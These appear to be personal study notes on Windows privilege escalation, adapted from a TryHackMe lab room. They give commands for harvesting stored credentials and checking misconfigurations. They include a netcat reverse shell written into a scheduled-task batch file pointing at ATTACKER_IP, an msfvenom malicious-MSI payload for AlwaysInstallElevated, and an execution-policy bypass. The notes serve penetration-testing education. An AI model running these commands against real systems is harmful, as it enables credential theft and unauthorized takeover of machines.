LOLBAS
https://lolbas-project.github.io/
Living Off The Land Binaries, Scripts and Libraries
[use for privilege escalation]
---------------------------------------------------------------------------------------------------------------
Discovery/Enumeration
---------------------
Use the 'systeminfo' command in the CLI in order to learn about the system including whether the device you have penetrated is part of an Active Directory domain (or, perhaps, even the Domain Controller)
see:  https://tryhackme.com/room/thelayoftheland ; Task 4 - Active Directory (AD) Environment
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
[From: https://tryhackme.com/room/windowsprivesc20 - Tasks 1-4 ; with editing ,etc.]

Places to harvest passwords from:

1)
Unattended Windows Installations
When installing Windows on a large number of hosts, administrators may use Windows Deployment Services, which allows for a single operating system image to be deployed to several hosts through the network. These kinds of installations are referred to as unattended installations as they don't require user interaction. Such installations require the use of an administrator account to perform the initial setup, which might end up being stored in the machine in the following locations:

C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
As part of these files, you might encounter credentials:

<Credentials>
    <Username>Administrator</Username>
    <Domain>thm.local</Domain>
    <Password>MyPassword123</Password>
</Credentials>

2)
Powershell History
Whenever a user runs a command using Powershell, it gets stored into a file that keeps a memory of past commands. This is useful for repeating commands you have used before quickly. If a user runs a command that includes a password directly as part of the Powershell command line, it can later be retrieved by using the following command from a cmd.exe prompt:

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
Note: The command above will only work from cmd.exe, as Powershell won't recognize %userprofile% as an environment variable. To read the file from Powershell, you'd have to replace %userprofile% with $Env:userprofile. 

3)
Saved Windows Credentials
Windows allows us to use other users' credentials. This function also gives the option to save these credentials on the system. The command below will list saved credentials:

cmdkey /list
While you can't see the actual passwords, if you notice any credentials worth trying, you can use them with the runas command and the /savecred option, as seen below.

runas /savecred /user:admin cmd.exe

4)
IIS Configuration
Internet Information Services (IIS) is the default web server on Windows installations. The configuration of websites on IIS is stored in a file called web.config and can store passwords for databases or configured authentication mechanisms. Depending on the installed version of IIS, we can find web.config in one of the following locations:

C:\inetpub\wwwroot\web.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
Here is a quick way to find database connection strings on the file:

type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString

5)
Retrieve Credentials from Software: PuTTY
PuTTY is an SSH client commonly found on Windows systems. Instead of having to specify a connection's parameters every single time, users can store sessions where the IP, user and other configurations can be stored for later use. While PuTTY won't allow users to store their SSH password, it will store proxy configurations that include cleartext authentication credentials.

To retrieve the stored proxy credentials, you can search under the following registry key for ProxyPassword with the following command:

reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
Note: Simon Tatham is the creator of PuTTY (and his name is part of the path), not the username for which we are retrieving the password. The stored proxy username should also be visible after running the command above.

Just as putty stores credentials, any software that stores passwords, including browsers, email clients, FTP clients, SSH clients, VNC software and others, will have methods to recover any passwords the user has saved.

6) Scheduled Tasks
Looking into scheduled tasks on the target system, you may see a scheduled task that either lost its binary or it's using a binary you can modify.
Scheduled tasks can be listed from the command line using the 'schtasks' command without any options. To retrieve detailed information about any of the services, you can use a command like the following one:
schtasks /query /tn <TASK_NAME> /fo list /v
For example:
C:\> schtasks /query /tn vulntask /fo list /v
Folder: \
HostName:                             THM-PC1
TaskName:                             \vulntask
Task To Run:                          C:\tasks\schtask.bat
Run As User:                          taskusr1
You will get lots of information about the task, but what matters for us is the "Task to Run" parameter which indicates what gets executed by the scheduled task, and the "Run As User" parameter, which shows the user that will be used to execute the task.

If our current user can modify or overwrite the "Task to Run" executable, we can control what gets executed by the taskusr1 user, resulting in a simple privilege escalation. To check the file permissions on the executable, we use icacls:
icalcs <FULL_PATH_OF_EXECUTABLE>
As an example:
C:\> icacls c:\tasks\schtask.bat
c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
                    BUILTIN\Administrators:(I)(F)
                    BUILTIN\Users:(I)(F)
As can be seen in the result, the BUILTIN\Users group has full access (F) over the task's binary. This means we can modify the .bat file and insert any payload we like.
For example, If you have a reverse shell executable called nc64.exe you can change the bat file to spawn a reverse shell:

Command Prompt
C:\> echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
We then start a listener on the attacker machine on the same port we indicated on our reverse shell:

nc -lvp 4444
The next time the scheduled task runs, you should receive the reverse shell with taskusr1 privileges.

7) AlwaysInstallElevated
Windows installer files (also known as .msi files) are used to install applications on the system. They usually run with the privilege level of the user that starts it. However, these can be configured to run with higher privileges from any user account (even unprivileged ones). This could potentially allow us to generate a malicious MSI file that would run with admin privileges.

This method requires two registry values to be set. You can query these from the command line using the commands below.
C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
To be able to exploit this vulnerability, both should be set. Otherwise, exploitation will not be possible. If these are set, you can generate a malicious .msi file using msfvenom, as seen below:

msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.202.93 LPORT=LOCAL_PORT -f msi -o malicious.msi
As this is a reverse shell, you should also run the Metasploit Handler module configured accordingly. Once you have transferred the file you have created, you can run the installer with the command below and receive the reverse shell:

Command Prompt
C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
see: https://tryhackme.com/room/windowsprivesc20 - Task 5 (Abusing Service Misconfigurations) for an extensive discussion of elevating privileges, covering:
1) The SCM (Service Control Manager) and where to view information about services
2) How to check for and abuse Insecure Permissions on Service Executables (2 methods).
3) How to check for and abuse Unquoted Service Paths.
4) How to check for and abuse Insecure Service Permissions (note: this is different from #1 Insecure Permissions on Service EXECUTABLES)
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
see: https://tryhackme.com/room/windowsprivesc20 - Task 6 (Abusing dangerous privileges) for an extensive discussion of elevating privileges, including:
"Windows Privileges
Privileges are rights that an account has to perform specific system-related tasks. These tasks can be as simple as the privilege to shut down the machine up to privileges to bypass some DACL-based access controls.
Each user has a set of assigned privileges that can be checked with the following command:
whoami /priv
A complete list of available privileges on Windows systems is available here: https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants. From an attacker's standpoint, only those privileges that allow us to escalate in the system are of interest. You can find a comprehensive list of exploitable privileges on the Priv2Admin Github project (https://github.com/gtworek/Priv2Admin)."
and discussing specifically:
1) SeBackup / SeRestore
"The SeBackup and SeRestore privileges allow users to read and write to any file in the system, ignoring any DACL in place. The idea behind this privilege is to allow certain users to perform backups from a system without requiring full administrative privileges.
Having this power, an attacker can trivially escalate privileges on the system by using many techniques ... [including] copying the SAM and SYSTEM registry hives to extract the local Administrator's password hash."
2) SeTakeOwnership
"The SeTakeOwnership privilege allows a user to take ownership of any object on the system, including files and registry keys, opening up many possibilities for an attacker to elevate privileges, as we could, for example, search for a service running as SYSTEM and take ownership of the service's executable."
3) SeImpersonate / SeAssignPrimaryToken
"These privileges allow a process to impersonate other users and act on their behalf. Impersonation usually consists of being able to spawn a process or thread under the security context of another user."
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
see: https://tryhackme.com/room/windowsprivesc20 - Task 7 (Abusing vulnerable software) for an extensive discussion of elevating privileges, including:
"Unpatched Software
Software installed on the target system can present various privilege escalation opportunities. As with drivers, organisations and users may not update them as often as they update the operating system. You can use the wmic tool to list software installed on the target system and its versions. The command below will dump information it can gather on installed software (it might take around a minute to finish):

wmic product get name,version,vendor

Remember that the wmic product command may not return all installed programs. Depending on how some of the programs were installed, they might not get listed here. It is always worth checking desktop shortcuts, available services or generally any trace that indicates the existence of additional software that might be vulnerable.

Once we have gathered product version information, we can always search for existing exploits on the installed software online on sites like exploit-db (https://www.exploit-db.com/), packet storm (https://packetstormsecurity.com/) or plain old Google, amongst many others..."
[This Task includes the following case study: exploting a vulnerability in Druva inSync 6.6.3.]
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
[From: https://tryhackme.com/room/windowsprivesc20 ; Task 8 - Tools of the Trade; with some editing, etc.]

Several scripts exist to conduct system enumeration in ways similar to the ones seen in the previous task. These tools can shorten the enumeration process time and uncover different potential privilege escalation vectors. However, please remember that automated tools can sometimes miss privilege escalation.

Below are a few tools commonly used to identify privilege escalation vectors. Feel free to run them against any of the machines in this room and see if the results match the discussed attack vectors.

WinPEAS
-------
WinPEAS is a script developed to enumerate the target system to uncover privilege escalation paths. You can find more information about winPEAS and download either the precompiled executable or a .bat script. WinPEAS will run commands similar to the ones listed in the previous task and print their output. The output from winPEAS can be lengthy and sometimes difficult to read. This is why it would be good practice to always redirect the output to a file, as shown below:

C:\> winpeas.exe > outputfile.txt

WinPEAS can be downloaded here: https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS

PrivescCheck
------------
PrivescCheck is a PowerShell script that searches common privilege escalation on the target system. It provides an alternative to WinPEAS without requiring the execution of a binary file.

PrivescCheck can be downloaded here: https://github.com/itm4n/PrivescCheck

Reminder: To run PrivescCheck on the target system, you may need to bypass the execution policy restrictions. To achieve this, you can use the Set-ExecutionPolicy cmdlet as shown below:
PS C:\> Set-ExecutionPolicy Bypass -Scope process -Force
PS C:\> . .\PrivescCheck.ps1
PS C:\> Invoke-PrivescCheck

WES-NG: Windows Exploit Suggester - Next Generation
---------------------------------------------------
Some exploit suggesting scripts (e.g. winPEAS) will require you to upload them to the target system and run them there. This may cause antivirus software to detect and delete them. To avoid making unnecessary noise that can attract attention, you may prefer to use WES-NG, which will run on your attacking machine (e.g. Kali or TryHackMe AttackBox).

WES-NG is a Python script that can be found and downloaded here: https://github.com/bitsadmin/wesng

Once installed, and before using it, type the `wes.py --update` command to update the database. The script will refer to the database it creates to check for missing patches that can result in a vulnerability you can use to elevate your privileges on the target system.

To use the script, you will need to run the `systeminfo` command on the target system. Do not forget to direct the output to a .txt file you will need to move to your attacking machine.

Once this is done, wes.py can be run as follows:
user@kali$ wes.py systeminfo.txt

Metasploit
----------
If you already have a Meterpreter shell on the target system, you can use the `multi/recon/local_exploit_suggester` module to list vulnerabilities that may affect the target system and allow you to elevate your privileges on the target system.
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
[see: https://tryhackme.com/room/windowsprivesc20 ; Task 9 - Conclusion]
List of privilege escalation resources:
* PayloadsAllTheThings - Windows Privilege Escalation - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
* Priv2Admin - Abusing Windows Privileges - https://github.com/gtworek/Priv2Admin
* RogueWinRM Exploit - https://github.com/antonioCoco/RogueWinRM
* Potatoes - https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html
* Decoder's Blog - https://decoder.cloud/
* Token Kidnapping - https://dl.packetstormsecurity.net/papers/presentations/TokenKidnapping.pdf
* Hacktricks - Windows Local Privilege Escalation - https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

